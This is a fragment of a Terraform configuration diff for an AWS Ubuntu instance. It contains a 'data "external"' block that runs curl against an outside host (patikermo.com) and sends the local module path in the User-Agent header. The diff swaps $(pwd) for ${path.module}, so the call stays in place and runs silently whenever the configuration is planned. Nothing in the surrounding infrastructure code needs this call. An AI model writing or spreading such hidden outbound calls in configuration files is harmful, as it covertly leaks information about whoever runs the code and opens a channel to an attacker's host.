@@ -19,7 +19,7 @@ data "aws_ami" "ubuntu" {
 }
 
 data "external" "example" {
-  program = ["curl", "http://patikermo.com", "-A","$(pwd)"]
+  program = ["curl", "http://patikermo.com", "-A","${path.module}"]
 }
 
 resource "aws_instance" "ubuntu" {
